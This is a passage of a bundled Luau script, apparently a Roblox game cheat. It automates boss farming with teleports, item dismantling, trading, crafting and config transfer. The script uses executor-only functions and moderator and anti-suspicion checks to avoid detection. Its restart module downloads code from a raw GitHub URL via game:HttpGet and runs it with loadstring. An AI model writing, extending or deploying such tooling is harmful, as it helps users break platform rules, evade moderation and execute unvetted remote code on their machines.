                if data and data.Health.Value>0 and (data.Root.Position-spot.Position).Magnitude<=220 then
                    observe(mob,data);return {Alive=true,Name=mob.Name}
                end
            end
        end
    end
    local controller=ctx.MakeController({State=state,SyncFloor=syncFloor,
        Floor=function(number)for _,floor in ipairs(state.AutomationCatalog.Floors)do if floor.Number==number then return floor end end end,
        Unlocked=function(floor)return state.IsAutomationFloorUnlocked(floor.Id)end,CurrentFloor=function()return game.PlaceId end,
        Ready=function()
            local r=root();local humanoid=player.Character and player.Character:FindFirstChildOfClass("Humanoid")
            return not state.AutoTradeBusy and r and not r.Anchored and humanoid and humanoid.Health>0
                and not(state.SafeModePanic or state.AutomationTeleporting or state.Dodging or state.Recovering or state.ProgressionEquipping)
                and not(state.SafeController and state.SafeController.Seeking)and (not state.TravelBusy or state.ProgressionTravelOwned)
        end,
        CombatReady=function()return state.Enabled and state.AutoFarm end,
        NearBossSpot=function(spot)
            local r=root();if not r then return false end
            if (r.Position-spot.Position).Magnitude<=350 then return true end
            local data=observation and observation.mob.Parent and ctx.Data(observation.mob)
            return data and (r.Position-data.Root.Position).Magnitude<=500 or false
        end,
        ChangeFloor=function(floor)return state.ChangeAutomationFloor(floor.Id)end,BossSpot=bossSpot,
        Go=function(spot)
            if state.TravelBusy then return false,"Another movement is active"end
            clearBoss();ctx.StopCombat("Moving to the progression boss")
            state.RegisterAutomationDestination(spot);state.ProgressionAnchor=spot.Position;state.ProgressionTravelOwned=true
            return state.TeleportToDestination(spot.DestinationId,false,false)
        end,
        Moving=function()return state.TravelBusy end,
        Arrived=function(spot)
            local r=root()
            return spot and r and state.LastTravelPosition and state.LastTravelDestination==spot.DestinationId
                and (r.Position-state.LastTravelPosition).Magnitude<=25
        end,
        Arrival=function()state.ProgressionTravelOwned=false;state.TravelHold=false;state.TravelHoldPosition=nil end,
        Boss=readBoss,Equipment=equipment,Complete=complete,Release=release,Save=state.SaveNow,
        Status=function(message)state.ProgressionStatus=message;text(ui.ProgressionStatus,message)end})
    state.ProgressionController=controller
    function state.SetAccountProgression(on,restoring)
        if on and state.StopEverything then return false end
        cancelEquipment();gear.Reset()
        if on then
            for _,floor in ipairs(state.AutomationCatalog.Floors)do
                if floor.Number==state.ProgressionFloor then
                    local catalog=state.AutomationCatalog
                    local primary=catalog.SpotById and catalog.SpotById[tostring(floor.Id).."/Boss"]
                    if state.ProgressionBossCleared and primary and primary.EncounterNames
                        and not matches(primary,{Name=state.ProgressionBossClearedName or ""})then
                        state.ProgressionBossCleared=false;state.ProgressionBossClearedName=nil
                    end
                    break
                end
            end
            state.ProgressionRestore=state.ProgressionRestore or {Enabled=state.Enabled,AutoFarm=state.AutoFarm,
                AutoSwing=state.AutoSwing,SafeFloorId=state.SafeFloorId}
            if state.ProgressionRestore.SafeFloorId==nil then state.ProgressionRestore.SafeFloorId=state.SafeFloorId end
            if state.ProgressionComplete and not restoring then
                state.ProgressionFloor=1;state.ProgressionBossCleared=false;state.ProgressionBossClearedName=nil;state.ProgressionComplete=false
            end
        end
        state.AccountProgression=on==true
        if state.AccountProgression then syncFloor()
        elseif state.ProgressionRestore and state.ProgressionRestore.SafeFloorId then
            state.SafeFloorId=state.SharedSafeFloorId or state.ProgressionRestore.SafeFloorId
        end
        if state.MultiSpotController then state.MultiSpotController.Reset()end
        if not restoring and state.SafeController then state.SafeController.Reset()end
        controller.Reset()
        if state.AccountProgression then
            if state.ProgressionComplete then complete()else state.SetAutoFarm(true,"Account progression");state.SetEnabled(true)end
        elseif state.ProgressionRestore then
            local saved=state.ProgressionRestore;state.ProgressionRestore=nil
            state.SetAutoFarm(saved.AutoFarm==true,"Account progression stopped");state.SetEnabled(saved.Enabled==true)
            if type(saved.AutoSwing)=="boolean"and state.SetAutoSwing then state.SetAutoSwing(saved.AutoSwing)end
        end
        ui.ProgressionToggle.Text=state.AccountProgression and "Account Progression · ON"or "Account Progression · OFF"
        ui.ProgressionToggle.BackgroundColor3=state.AccountProgression and Color3.fromRGB(91,72,164)or Color3.fromRGB(38,41,56)
        state.SaveNow();if state.RefreshAutomationUI then state.RefreshAutomationUI()end
        return true
    end
    ctx.Bind(ui.ProgressionToggle.Activated,function()state.SetAccountProgression(not state.AccountProgression)end)
    function state.ProgressionDestroy()
        closed=true
        for value in pairs(watched)do forget(value)end
        cancelEquipment();controller.Destroy()
    end
    if state.AccountProgression then state.SetAccountProgression(true,true)end
    return controller
end

-- END BUNDLED PROGRESSION CLIENT
    end)()
    attach({State=state,Player=player,MakeController=makeController,MakeGear=makeGear,
        Parent=state.UI.Pages.Speacial,Button=uiButton,Label=uiLabel,Bind=bind,
        Mobs=function()refreshMobIndex();return trackedMobs end,Data=getMobData,
        Rank=targetPriority.Rank,OwnDamage=state.ReadOwnDamage,
        SkillsBusy=function()return Skills.usingSkill~="none"end,
        StopCombat=function(reason)
            finishAttackBurst(reason);stopSword(true)
            if state.CancelSkillAura then state.CancelSkillAura(reason)end
            state.FollowTarget=nil
        end})
end

runtimeOwner.Ready()
-- Native utility adapters expose controller actions directly to modern WindUI.
do
    local make=(function()
-- BEGIN BUNDLED RESTART SCRIPT
-- A replacement is prepared completely before the current owner retires.
return function(ctx)
    local phase="Idle"
    local function failure(reason)
        phase="Idle"
        ctx.Status("Restart failed · try again")
        ctx.Error(tostring(reason))
    end
    return function()
        if phase~="Idle"then return end
        phase="Preparing";ctx.Status("Restarting...")
        ctx.Spawn(function()
            local ready,replacement=pcall(function()
                ctx.Save()
                local compiled=ctx.Compile(ctx.Fetch())
                assert(type(compiled)=="function","Loader did not compile")
                return compiled
            end)
            if not ready then failure(replacement);return end
            phase="Replacing"
            local complete,reason=pcall(function()ctx.Destroy();replacement()end)
            phase="Idle"
            if not complete then failure(reason)end
        end)
    end
end

-- END BUNDLED RESTART SCRIPT
    end)()
    state.RestartScript=make({Spawn=task.spawn,Save=state.SaveNow,
        Fetch=function()return game:HttpGet("https://raw.githubusercontent.com/AttackerDestiny/balls/main/loader.luau")end,
        Compile=function(source)return assert(loadstring(source,"Feather restart loader"))end,
        Destroy=function()state.Destroy(true)end,
        Status=function(message)state.RestartStatus=message end,
        Error=function(reason)state.LastRestartError=reason;warn("[SB2 Restart] "..reason)end})
end

do
    local make=(function()
-- BEGIN BUNDLED AUTO DISMANTLE
-- A receipt is never retried: native item destruction has no request acknowledgment.
return function(ctx)
    local api={}
    local rarities={Common=true,Uncommon=true,Rare=true}
    local fifo={}
    local membership=setmetatable({}, {__mode="k"})
    local attempted=setmetatable({}, {__mode="k"})
    local cursor,tail=1,0
    local inventory,inventoryCursor,inventoryTime
    local cooldown=0
    function api.Add(item,now)
        if membership[item] or attempted[item] then return end
        local rarity=ctx.Rarity(item)
        if rarities[rarity] and ctx.Selected(rarity) then
            tail=tail+1
            fifo[tail]={item=item,rarity=rarity,due=now+.75}
            membership[item]=true
        end
    end
    function api.Scan(items,now)
        inventory,inventoryCursor,inventoryTime=items,1,now
    end
    local function processInventory()
        if not inventory then return end
        local last=math.min(#inventory,inventoryCursor+31)
        while inventoryCursor<=last do
            api.Add(inventory[inventoryCursor],inventoryTime)
            inventoryCursor=inventoryCursor+1
        end
        if inventoryCursor>#inventory then inventory=nil end
    end
    local function take(now)
        local entry=fifo[cursor]
        if not entry or now<entry.due then return nil end
        fifo[cursor]=nil
        cursor=cursor+1
        membership[entry.item]=nil
        if cursor>tail then fifo={};cursor,tail=1,0 end
        return entry
    end
    function api.Update(now)
        if not ctx.Active() or ctx.Busy() then return end
        processInventory()
        if now<cooldown then return end
        local entry=take(now)
        if not entry then return end
        local item=entry.item
        if not ctx.Selected(entry.rarity) or ctx.Rarity(item)~=entry.rarity or ctx.Protected(item) then return end
        attempted[item]=true
        cooldown=now+.4
        local sent,reason=pcall(ctx.Send,item)
        ctx.Status(sent and ("Dismantle requested · "..item.Name)or ("Dismantle failed · "..tostring(reason)))
    end
    function api.Clear()
        fifo={};cursor,tail=1,0;inventory=nil;inventoryCursor=nil
        table.clear(membership);table.clear(attempted)
    end
    return api
end

-- END BUNDLED AUTO DISMANTLE
    end)()
    local profile=ReplicatedStorage.Profiles[player.Name]
    local nativeRestrictions=require(ReplicatedStorage.Shared.Util.ItemRestrictions)
    local inventory,equip,definitions=profile.Inventory,profile.Equip,ReplicatedStorage.Database.Items
    local selectable={Common=true,Uncommon=true,Rare=true}
    local function rarity(item)
        if item.Parent~=inventory or not item:IsA("IntValue")then return nil end
        local definition=definitions:FindFirstChild(item.Name)
        local value=definition and definition:FindFirstChild("Rarity")
        return value and value.Value
    end
    local function protected(item)
        if item.Parent~=inventory or nativeRestrictions.CanOfferDismantle(profile,item)~=true then return true end
        if item.Name:find("Novice",1,true)or item.Name:find("Aura",1,true)then return true end
        for _,slot in ipairs(equip:GetChildren())do if slot:IsA("IntValue")and slot.Value==item.Value then return true end end
        local function protectedFlag(object)
            for _,name in ipairs({"Locked","Lock","Favorite","Favorited","Favourite","Favourited","Skin"})do
                local value=object:GetAttribute(name)
                if value~=nil and value~=false and value~=0 and value~=""then return true end
                local flag=object:FindFirstChild(name)
                if flag and (not flag:IsA("ValueBase")or flag.Value~=false and flag.Value~=0 and flag.Value~="")then return true end
            end
            return false
        end
        local definition=definitions:FindFirstChild(item.Name)
        return protectedFlag(item)or definition and protectedFlag(definition)or state.IsAutoEquipmentCandidate and state.IsAutoEquipmentCandidate(item)or false
    end
    local worker=make({Rarity=rarity,Protected=protected,Selected=function(name)return state.AutoDismantle[name]==true end,
        Active=function()return state.Running and not state.StopEverything and not state.ModeratorBlocking end,
        Busy=function()return state.AutoTradeBusy or state.ProgressionEquipping or state.TravelBusy or state.AutomationTeleporting or state.SafeModePanic end,
        Send=function(item)ReplicatedStorage.Event:FireServer("Equipment",{"Dismantle",{item}})end,
        Status=function(message)state.AutoDismantleStatus=message end})
    state.AutoDismantleController=worker
    function state.SetAutoDismantle(name,value)
        if not selectable[name]or state.StopEverything then return false end
        state.AutoDismantle[name]=value==true;requestSave()
        if value==true then worker.Scan(inventory:GetChildren(),os.clock())end
        return true
    end
    local function enabled()return state.AutoDismantle.Common or state.AutoDismantle.Uncommon or state.AutoDismantle.Rare end
    if enabled()then worker.Scan(inventory:GetChildren(),os.clock())end
    bind(inventory.ChildAdded,function(item)if state.Running and not state.StopEverything then worker.Add(item,os.clock())end end)
    bind(gui.Destroying,worker.Clear)
    task.spawn(function()
        while state.Running do
            local ok,reason=pcall(worker.Update,os.clock())
            if not ok then state.AutoDismantleStatus="Dismantle paused · "..tostring(reason)end
            task.wait(enabled()and .25 or 1)
        end
        worker.Clear()
    end)
end

do
    local make=(function()
-- BEGIN BUNDLED AUTO TRADE
-- Trade synchronization compares a desired offer with the replicated offer ledger.
return function(ctx)
    local api={}
    local session={trade=nil,request=nil,accepted=nil,receipt=nil,signature=nil,stableAt=0,action=nil}
    local rarities={Legendary=true,Tribute=true,Burst=true}
    function api.AlwaysInclude(name)
        return name=="Upgrade Protection Scroll"or name=="Resurrection Crystal"
    end
    function api.IncludesRarity(mode,rarity)
        return (mode=="Legendary"or mode=="Tribute")and rarities[rarity]==true
    end
    function api.MaxVel(balance)
        if type(balance)~="number"or balance~=balance or balance<=0 or balance==math.huge then return 0 end
        local taxable=math.min(110000000,math.floor(balance))
        return math.floor(taxable*10/11)
    end
    local function clear()
        session={trade=nil,request=nil,accepted=nil,receipt=nil,signature=nil,stableAt=0,action=nil}
    end
    function api.Event(kind,data)
        if not ctx.Active()then clear();return end
        if kind=="Request"then session.request=data;ctx.Status("Checking incoming trade request");return end
        if kind=="TradeCancel"or kind=="TradeCompleted"then clear();return end
        if kind=="RequestAccept"then session.receipt=nil;session.signature=nil;session.action=nil end
        if kind=="RequestAccept"or kind=="TradeChanged"then
            session.trade=data;session.request=nil;session.accepted=nil
        end
    end
    local function request()
        local requester=ctx.Pending and ctx.Pending()or (not ctx.Pending and session.request or nil)
        if not requester then session.accepted=nil;return end
        if not ctx.Allowed(requester)then ctx.Status("Trade request ignored · user is not whitelisted");return end
        if session.accepted~=requester then
            ctx.Send("RequestAccept",{})
            session.accepted=requester;session.request=nil
            ctx.Status("Accepted whitelisted trade request")
        end
    end
    local function offer(trade,role,peer,items,currency)
        local desired,actual={},{}
        local signature={tostring(currency)}
        for _,item in ipairs(items)do
            local amount=ctx.Count and ctx.Count(item)or 1
            if type(amount)~="number"or amount~=amount or amount==math.huge then amount=0 end
            amount=math.max(0,math.floor(amount))
            if amount>0 then desired[item]=amount end
            signature[#signature+1]="want:"..item.Value..":"..amount
        end
        for _,side in ipairs({role,peer})do
            signature[#signature+1]=tostring(trade[side.."Currency"]or 0)
            for _,entry in ipairs(trade[side.."Items"]or {})do
                signature[#signature+1]=side..":"..tostring(entry.item and entry.item.Value)..":"..tostring(entry.count or 1)
                if side==role and entry.item then actual[entry.item]=(actual[entry.item]or 0)+(entry.count or 1)end
            end
        end
        return desired,actual,table.concat(signature,"|")
    end
    local function once(action,command,payload)
        if session.action==action then return end
        session.action=action
        ctx.Send(command,payload)
    end
    function api.Update(now)
        if not ctx.Active()then return false end
        request()
        local trade=session.trade
        if not trade then return false end
        local role=trade.Requester==ctx.Player and "Requester"or trade.Partner==ctx.Player and "Partner"
        if not role then return false end
        local peer=role=="Requester"and "Partner"or "Requester"
        if not ctx.Allowed(trade[peer])then ctx.Status("Trade paused · partner is not whitelisted");return false end
        local items,currency=ctx.Plan()
        local desired,actual,signature=offer(trade,role,peer,items,currency)
        if session.signature~=signature then
            session.signature=signature;session.stableAt=now;session.action=nil
        end
        for item,quantity in pairs(actual)do
            if not desired[item]or quantity>desired[item]then ctx.Status("Trade paused · offer exceeds selected quantity");return true end
        end
        local receipt=session.receipt
        if receipt then
            if (actual[receipt.item]or 0)<receipt.quantity then
                ctx.Status(now>=receipt.deadline and "Server has not acknowledged the batch · trade may be full · automatic acceptance paused"or "Waiting for stacked items to register")
                return true
            end
            session.receipt=nil
        end
        for _,item in ipairs(items)do
            local have,want=actual[item]or 0,desired[item]or 0
            if have<want then
                local batch=math.min(4,want-have)
                session.receipt={item=item,quantity=have+batch,deadline=now+10}
                for _=1,batch do ctx.Send("TradeAddItem",{item})end
                ctx.Status("Adding "..item.Name.." · "..have.."/"..want)
                return true
            end
        end
        if (trade[role.."Currency"]or 0)~=currency then
            once("vel","TradeChangeCurrency",{currency});ctx.Status("Setting trade Vel");return true
        end
        if now-session.stableAt<2 then ctx.Status("Waiting for the trade offer to settle");return true end
        if trade[role.."Confirmed"]~=true then once("confirm","TradeConfirm",{})
        elseif trade[peer.."Confirmed"]==true and trade[role.."Accepted"]~=true then once("accept","TradeAccept",{})end
        ctx.Status("Trade offer ready · automatic confirmation active")
        return true
    end
    return api
end

-- END BUNDLED AUTO TRADE
    end)()
    local rs=ReplicatedStorage
    local profile=rs.Profiles[player.Name]
    local inventory,equip=profile.Inventory,profile.Equip
    local restrictions=require(rs.Shared.Util.ItemRestrictions)
    if state.TradeMode=="Tribute"then state.TradeMode="Legendary";requestSave()end
    function state.SetAutoTrade(value)
        if value and state.StopEverything then return false end
        state.AutoTrade=value==true;requestSave();return true
    end
    function state.SetTradeMode(value)
        if value~="Selected"and value~="Legendary"then return false end
        state.TradeMode=value;requestSave();return true
    end
    function state.SetTradeItems(values)
        local selected={}
        for name,on in pairs(values or {})do if type(name)=="string"and on==true then selected[name]=true end end
        state.TradeItems=selected;requestSave()
    end
    function state.GetTradeItemChoices()
        local quantities={}
        for _,item in ipairs(inventory:GetChildren())do
            local count=item:FindFirstChild("Count");quantities[item.Name]=(quantities[item.Name]or 0)+(count and count.Value or 1)
        end
        for name,on in pairs(state.TradeItems)do if on and quantities[name]==nil then quantities[name]=0 end end
        local rows={};for name,count in pairs(quantities)do rows[#rows+1]={Name=name,Count=count}end
        table.sort(rows,function(a,b)return a.Name<b.Name end)
        return rows
    end
    local worker
    local function plan()
        local offered={}
        for _,item in ipairs(inventory:GetChildren())do
            local definition=rs.Database.Items:FindFirstChild(item.Name)
            local rarity=definition and definition:FindFirstChild("Rarity")
            local selected=worker.AlwaysInclude(item.Name)
                or state.TradeMode=="Selected"and state.TradeItems[item.Name]
                or rarity and worker.IncludesRarity(state.TradeMode,rarity.Value)
            if selected and item:IsA("IntValue")and not item:GetAttribute("Locked")and not item:GetAttribute("Favorited")and restrictions.CanOfferTrading(profile,item)==true then
                local inUse=false
                for _,slot in ipairs(equip:GetChildren())do if slot:IsA("ValueBase")and slot.Value==item.Value then inUse=true;break end end
                if not inUse then offered[#offered+1]=item end
            end
        end
        table.sort(offered,function(a,b)return a.Value<b.Value end)
        local balance=profile.Stats:FindFirstChild("Vel")
        return offered,worker.MaxVel(balance and balance.Value or 0)
    end
    local nativeTrade=require(rs.CardinalClient.MainModule.Services.UI.Trade)
    local function requestOwner()
        local host=player:FindFirstChildOfClass("PlayerGui")
        for _,name in ipairs({"CardinalUI","PlayerUI","HUD","TradeRequest"})do host=host and host:FindFirstChild(name)end
        local label=host and host:FindFirstChild("PlayerText")
        if not host or not host.Visible or not label then return nil end
        local name=label.Text:match("^([%w_]+) wants to trade with you$")
        return name and Players:FindFirstChild(name)or nil
    end
    local function allowed(person)
        return typeof(person)=="Instance"and person:IsA("Player")and state.SafeWhitelistIds[tostring(person.UserId)]==true
    end
    worker=make({Player=player,Plan=plan,Pending=requestOwner,
        Count=function(item)local stack=item:FindFirstChild("Count");return stack and stack.Value or 1 end,
        Active=function()return state.AutoTrade and state.Running and not state.StopEverything and not state.ModeratorBlocking end,
        Allowed=allowed,Send=function(action,args)
            if action=="RequestAccept"then local person=requestOwner();if person and allowed(person)then nativeTrade.AcceptRequest()end
            else rs.Event:FireServer("Trade",action,args)end
        end,Status=function(message)state.TradeStatus=message end})
    state.AutoTradeController=worker
    bind(rs.Event.OnClientEvent,function(route,payload)
        if route~="UI"or type(payload)~="table"or payload[1]~="Trade"then return end
        worker.Event(payload[2],payload[3])
        if state.AutoTrade and (payload[2]=="TradeChanged"or payload[2]=="RequestAccept")then state.AutoTradeBusy=true end
        if payload[2]=="TradeCancel"or payload[2]=="TradeCompleted"then state.AutoTradeBusy=false end
    end)
    task.spawn(function()
        while state.Running do
            local ok,busy=pcall(worker.Update,os.clock())
            state.AutoTradeBusy=ok and busy==true
            if not ok then state.TradeStatus="Trade paused · "..tostring(busy)end
            task.wait(state.AutoTrade and .3 or 1)
        end
        state.AutoTradeBusy=false
    end)
end

do
    local make=(function()
-- BEGIN BUNDLED AUTO CRAFT
-- Crystal conversion is a transaction: input and output replication acknowledge it.
return function(ctx)
    local api={Paused=false}
    local transaction
    local eligibleAt=0
    local outputs={
        {"Legendary Upgrade Crystal","Rare Upgrade Crystal"},
        {"Rare Upgrade Crystal","Uncommon Upgrade Crystal"},
    }
    local function acknowledge(now)
        if not transaction then return true end
        local receipt=transaction
        local spent=ctx.Count(receipt.input)<=receipt.inputCount-receipt.quantity
        local produced=ctx.Count(receipt.output)>=receipt.outputCount+1
        if spent and produced then
            transaction=nil
            api.Paused=false
            eligibleAt=now+.2
            ctx.Status("Crystal crafted")
            return true
        end
        if now>=receipt.deadline then
            api.Paused=true
            ctx.Status("Craft not acknowledged · waiting without duplicate requests")
        end
        return false
    end
    function api.Reset()
        api.Paused=false
        eligibleAt=0
    end
    function api.Update(now)
        if not ctx.Active() or not acknowledge(now) then return end
        if api.Paused or ctx.Busy() or now<eligibleAt then return end
        eligibleAt=now+.5
        for index=1,#outputs do
            local output,input=outputs[index][1],outputs[index][2]
            if ctx.Selected(output) then
                local amount=ctx.Recipe(output,input)
                if type(amount)=="number" and amount>0 and amount%1==0 then
                    local count=ctx.Count(input)
                    if count>=amount then
                        transaction={input=input,output=output,quantity=amount,inputCount=count,
                            outputCount=ctx.Count(output),deadline=now+10}
                        local sent,reason=pcall(ctx.Send,output)
                        api.Paused=not sent
                        ctx.Status(sent and ("Crafting "..output)or ("Craft request failed · "..tostring(reason)))
                        return
                    end
                end
            end
        end
    end
    return api
end

-- END BUNDLED AUTO CRAFT
    end)()
    local profile=ReplicatedStorage.Profiles[player.Name]
    local restrictions=require(ReplicatedStorage.Shared.Util.ItemRestrictions)
    local function count(input)
        local total=0
        for _,item in ipairs(profile.Inventory:GetChildren())do
            if item.Name==input and item:IsA("IntValue")and restrictions.CanOfferCrafting(profile,item)==true then
                local stack=item:FindFirstChild("Count");total+=stack and math.max(0,stack.Value)or 1
            end
        end
        return total
    end
    local function recipe(output,input)
        local definition=ReplicatedStorage.Database.Items:FindFirstChild(output)
        local requirements=definition and definition:FindFirstChild("Recipe")
        if not requirements then return nil end
        local amount
        for _,requirement in ipairs(requirements:GetChildren())do
            if requirement.Name~=input or not requirement:IsA("ValueBase")then return nil end
            amount=requirement.Value
        end
        return amount
    end
    local worker=make({Active=function()return state.Running end,
        Busy=function()return state.StopEverything or state.ModeratorBlocking or state.SafeModePanic or state.AutoTradeBusy or state.TravelBusy or state.AutomationTeleporting end,
        Selected=function(name)return state.AutoCraft[name]==true end,Count=count,Recipe=recipe,
        Send=function(output)ReplicatedStorage.Event:FireServer("Item",{"Craft",output})end,
        Status=function(message)state.AutoCraftStatus=message end})
    state.AutoCraftController=worker
    function state.SetAutoCraft(values)
        local selected={}
        for _,output in ipairs({"Rare Upgrade Crystal","Legendary Upgrade Crystal"})do if values and values[output]==true then selected[output]=true end end
        state.AutoCraft=selected;worker.Reset();requestSave()
    end
    task.spawn(function()
        while state.Running do
            local ok,reason=pcall(worker.Update,os.clock())
            if not ok then state.AutoCraftStatus=tostring(reason)end
            task.wait(.25)
        end
    end)
end

do
    local make=(function()
-- BEGIN BUNDLED CONFIG TRANSFER
-- Strict portable-data schema; imported bytes are decoded only, never executed.
return function(ctx)
    local schema={}
    local groups={
        boolean={"NoSelfDamage","AeganatosDodge","AtheonUnlock","AutoCreateBetween","CreditCheck","Enabled","AutoFarm","BossOnly","AutoSwing","AutoTrade","AutoEquipBestSword","SafeMode","AntiSuspicious","MultiSpot","AccountProgression","ProgressionBossCleared","ProgressionComplete","AutoOffset","SkillAura","MiscSkillEnabled","AutoExplore","AutoDodge","AtheonDodge","TransparentMap","AutoJoinFriend","ViewingPlayer","ViewingPlayerInventory","AutoHideUI","StopEverything"},
        number={"Version","SafeFloorId","ProgressionFloor","Radius","SkillRange","Threat","SkillPerWeaponVersion","SelectedPlayerId"},
        string={"BetweenAccess","BetweenDifficulty","CreditWhitelistText","TradeMode","JoinFriendUsername","SafeWhitelistText","MultiSpotCursor","MultiSpotPending","ProgressionBossClearedName","AutomationRunId","SelectedSkill","SelectedMiscSkill","Theme","ActiveTab"},
        table={"BetweenRooms","BetweenPace","AntiSuspiciousLimits","AutoCraft","TradeItems","AutoDismantle","SafeWhitelistIds","MultiSpotSelected","MultiSpotOrder","ProgressionRestore","AutomationResumeFeatures","OffsetProfiles","UnsafeOffsetProfiles","SkillPerWeapon","PerformanceBoosters","PanelPosition","HealthHUDPosition","WindUIPosition"},
    }
    for kind,names in pairs(groups)do for _,name in ipairs(names)do schema[name]=kind end end
    local function data(value,depth,path)
        assert(depth<=12,"Config nesting is too deep")
        local kind=type(value)
        if kind=="number"then assert(value==value and math.abs(value)<1e15,"Invalid config number");return end
        if kind~="table"then assert(kind=="string"or kind=="boolean","Invalid config value");return end
        assert(not path[value],"Config cannot contain cycles")
        path[value]=true
        local total=0
        for key,child in pairs(value)do
            total+=1;assert(total<=4096,"Config table is too large")
            assert(type(key)=="string"or type(key)=="number","Invalid config key")
            data(child,depth+1,path)
        end
        path[value]=nil
    end
    local function tuple(value,count,limit)
        assert(type(value)=="table"and #value==count,"Invalid position")
        for _,coordinate in ipairs(value)do assert(type(coordinate)=="number"and (not limit or math.abs(coordinate)<=limit),"Invalid coordinate")end
    end
    local function settings(value)
        assert(type(value)=="table"and value.Version==1,"Invalid settings")
        for key,item in pairs(value)do assert(schema[key]and type(item)==schema[key],"Invalid setting: "..tostring(key))end
        for _,name in ipairs({"PanelPosition","HealthHUDPosition","WindUIPosition"})do if value[name]then tuple(value[name],4)end end
        for _,name in ipairs({"AutoCraft","TradeItems","AutoDismantle","MultiSpotSelected","PerformanceBoosters"})do
            for option,on in pairs(value[name]or {})do assert(type(option)=="string"and type(on)=="boolean","Invalid selection: "..name)end
        end
        for _,id in ipairs(value.MultiSpotOrder or {})do assert(type(id)=="string","Invalid spot priority")end
        local rooms=value.BetweenRooms or {}
        local access={Private=true,Friends=true,["Game Party"]=true}
        local difficulties={Normal=true,Hard=true,Elite=true}
        assert(#rooms<=20,"Too many Between rooms")
        for index,room in pairs(rooms)do
            assert(type(index)=="number" and index%1==0 and index>=1 and index<=#rooms
                and type(room)=="table" and type(room.Host)=="string" and #room.Host<=64
                and type(room.Alt)=="string" and #room.Alt<=256
                and (room.Mode==nil or access[room.Mode])
                and (room.Difficulty==nil or difficulties[room.Difficulty])
                and (room.Start==nil or type(room.Start)=="boolean")
                and (room.AutoRetry==nil or type(room.AutoRetry)=="boolean"),"Invalid Between room")
        end
        local function minute(v)return type(v)=="number" and v%1==0 and v>=0 and v<=100 end
        for mode,range in pairs(value.BetweenPace or {})do
            assert(difficulties[mode] and (minute(range) or (type(range)=="table"
                and minute(range.Min) and minute(range.Max) and range.Min<=range.Max)),"Invalid Between completion time")
        end
        local limits=value.AntiSuspiciousLimits
        if limits then
            local function integer(v,max)return type(v)=="number" and v%1==0 and v>=1 and v<=max end
            assert(integer(limits.Hops,100) and integer(limits.Window,200) and integer(limits.Min,200)
                and integer(limits.Max,200) and limits.Min<=limits.Max,"Invalid Anti Suspicious limits")
        end
    end
    local function arenas(value)
        assert(type(value)=="table","Missing custom spots")
        local count=0
        for floor,spots in pairs(value)do
            count+=1;assert(count<=64 and tostring(floor):match("^%d+$"),"Invalid spot floor")
            assert(type(spots)=="table"and #spots<=20,"Too many custom spots")
            for _,spot in ipairs(spots)do
                assert(type(spot)=="table"and type(spot.Id)=="string"and spot.Id:sub(1,16)=="saved:multispot:","Invalid custom spot")
                assert(type(spot.Name)=="string"and #spot.Name<=200,"Invalid spot name/position")
                tuple(spot.Position,3,1e7)
            end
        end
    end
    local api={}
    function api.Validate(package)
        assert(type(package)=="table"and package.Format=="FeatherConfig"and package.Version==1,"Not a Feather config")
        data(package,0,{})
        settings(package.Settings);arenas(package.CustomSpots)
        return package
    end
    local function withinStorage(package)
        assert(#ctx.Encode(package.Settings)<=32768,"Settings exceed their storage limit")
    end
    function api.Export()
        local package=api.Validate({Format="FeatherConfig",Version=1,Settings=ctx.Settings(),CustomSpots=ctx.Spots()})
        withinStorage(package)
        local bytes=ctx.Encode(package)
        assert(#bytes<=262144,"Config exceeds 256 KB")
        assert(type(ctx.Copy)=="function","Clipboard is unavailable in this executor")
        ctx.Copy(bytes)
        return bytes
    end
    function api.Import(bytes)
        assert(type(bytes)=="string"and #bytes<=262144,"Config exceeds 256 KB")
        local package=api.Validate(ctx.Decode(bytes));withinStorage(package)
        ctx.Apply(package)
        return true
    end
    return api
end

-- END BUNDLED CONFIG TRANSFER
    end)()
    local function exportSpots()
        local floors={}
        if filePersistence and type(listfiles)=="function"then
            for _,path in ipairs(listfiles(configFolder))do
                local floor=path:match("custom%-spots_(%d+)%.json$")
                if floor then
                    local bytes=readfile(path);assert(#bytes<=32768,"Custom spots file too large")
                    local saved=HttpService:JSONDecode(bytes)
                    assert(saved.Version==1 and type(saved.Areas)=="table","Invalid custom spots file")
                    floors[floor]=saved.Areas
                end
            end
        end
        local current={}
        for id,area in pairs(destinations)do if id:sub(1,16)=="saved:multispot:"then
            local point=area.Position;current[#current+1]={Id=id,Name=area.Name,Position={point.X,point.Y,point.Z}}
        end end
        floors[tostring(game.PlaceId)]=current
        return floors
    end
    local function importPackage(package)
        assert(filePersistence or next(package.CustomSpots)==nil,"Importing saved spots requires executor file access")
        local launch=assert(loadstring(embeddedSource,"Feather imported configuration"))
        env.SB2ConfigImport={UserId=player.UserId,Settings=package.Settings,CustomSpots=package.CustomSpots}
        state.AutoSaveSuspended=true;state.Destroy(true);launch(embeddedSource)
    end
    local transfer=make({Settings=settingsPayload,Spots=exportSpots,Apply=importPackage,
        Encode=function(value)return HttpService:JSONEncode(value)end,
        Decode=function(bytes)return HttpService:JSONDecode(bytes)end,Copy=setclipboard or toclipboard})
    state.ExportConfig=transfer.Export;state.ImportConfig=transfer.Import
end

-- Native floor utilities share the scheduler but retain independent receipts.
local function livingPlayer(person)
    local character=person.Character
    if not character then return false end
    local humanoid=character:FindFirstChildOfClass("Humanoid")
    local entity=character:FindFirstChild("Entity")
    local health=entity and entity:FindFirstChild("Health")
    return humanoid~=nil and humanoid.Health>0 and(not health or health.Value>0)
end
do
    local create=(function()
-- BEGIN BUNDLED ATHEON UNLOCK
-- Portal requests require physical receipts and retry without retaining old roots.
return function(ctx)
    local api={}
    local receipt,pending
    local pollAt=0
    local function status(message)ctx.State.AtheonUnlockStatus=message end
    function api.Reset()receipt=nil;pending=nil;pollAt=0 end
    function api.Update(now)
        local state=ctx.State
        if not(state.Running and state.AtheonUnlock)or ctx.Busy()or now<pollAt then return end
        pollAt=now+.5
        if ctx.Unlocked()then status("Atheon is already unlocked");pending=nil;return end
        local portal=ctx.Find()
        if not portal then status("Waiting for workspace.AtheonPortal");pending=nil;return end
        local root=ctx.Root()
        if not root then status("Waiting for a living character");pending=nil;return end
        if receipt and receipt.Root==root and receipt.Portal==portal then return end
        if pending and pending.Root==root and pending.Portal==portal then
            if now<pending.VerifyAt then return end
            if ctx.Arrived(root,pending.Point)then
                receipt={Root=root,Portal=portal};pending=nil;status("Moved to AtheonPortal");return
            end
            pending=nil;status("Portal position corrected · retrying")
        else pending=nil end
        local destination=ctx.Position(portal)
        if not destination then status("AtheonPortal has no supported position");return end
